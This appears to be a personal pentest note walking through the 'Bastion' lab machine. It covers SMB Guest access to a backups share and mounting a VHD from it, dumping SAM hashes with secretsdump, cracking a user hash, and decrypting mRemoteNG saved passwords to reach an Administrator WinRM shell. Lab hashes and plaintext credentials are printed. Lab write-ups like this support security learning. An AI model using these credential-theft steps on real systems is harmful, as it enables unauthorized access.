202302031424
Status: #cme #mRemoteNG #decrypt
Tags: [[Labs]]

# Bastion
IP: 10.10.10.134

## Recon

Ports open:

```
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Port 445:

- We were able to authenticate with the `Guest` account and found a `backups` share that we can read

![[bastion_shares.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bastion_shares.png">

- After enumerating through the shares we find vhd files
- We now go ahead and mount the share onto our attacker machine

```bash
sudo mount -t cifs //$IP/$SHARE /mnt/$PATH -o rw
```

- Now that we have mounted the remote share, we can mount the vhd file 

```bash
sudo guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/$SHARE -v
```

- Now that we have mounted the vhd file, we can get the SYSTEM and SAM files which make up the SAM database, this is located in `C:\Windows\System32\config`

## Establish Foothold

- Now we can use secretsdump to fetch the hashes

```
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

- We were able to grab hashes

```
[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

- Unfortunately it does not seem that we could get a shell via winRM by passing the hash
- We used an online tool called `crackstation` to crack the hash for the `L4mpje` account

![[bastion_ntlmcrack.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bastion_ntlmcrack.png">

- So now we have valid credentials, `L4mpje:bureaulampje`

## Escalate Privileges

- After manual enumeration we were able to find a program in the program files directory named `mRemoteNG`
- After doing some research for this software, we found that it stores encrypted passwords in a `confCons.xml` file for each user

![[bastion_mremoteng.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bastion_mremoteng.png">

- Now with this password, we can use a decrypt tool from github that decrypts the mRemoteNG encrypted passwords

![[bastion_decryptpass.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/bastion_decryptpass.png">

- We now have valid credentials for the Administrator, `Adiministrator:thXLHM96BeKL0ER2`
- We can now get a shell with these credentials via winRM and are now Administrator


---
# References

mRemoteNG - https://ethicalhackingguru.com/how-to-exploit-remote-connection-managers/

mRemoteNG Pass Decrypt - https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py
